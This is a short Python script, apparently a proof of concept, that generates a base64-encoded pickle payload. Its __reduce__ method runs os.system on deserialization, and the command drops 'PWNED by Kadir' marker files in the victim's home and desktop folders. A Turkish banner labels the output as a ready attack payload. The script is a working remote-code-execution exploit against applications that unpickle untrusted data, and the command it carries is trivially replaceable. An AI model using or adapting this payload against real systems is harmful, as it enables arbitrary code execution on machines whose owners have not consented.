import pickle
import base64
import os

class Pwned:
    def __reduce__(self):
        cmd = "echo 'PWNED by Kadir' > ~/HACKED.txt; echo 'PWNED by Kadir' > ~/Desktop/HACKED.txt; echo 'PWNED by Kadir' > ~/Masaüstü/HACKED.txt"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Pwned())).decode()
print("\n[+] SALDIRI PAYLOAD'U HAZIR:\n")
print(payload)
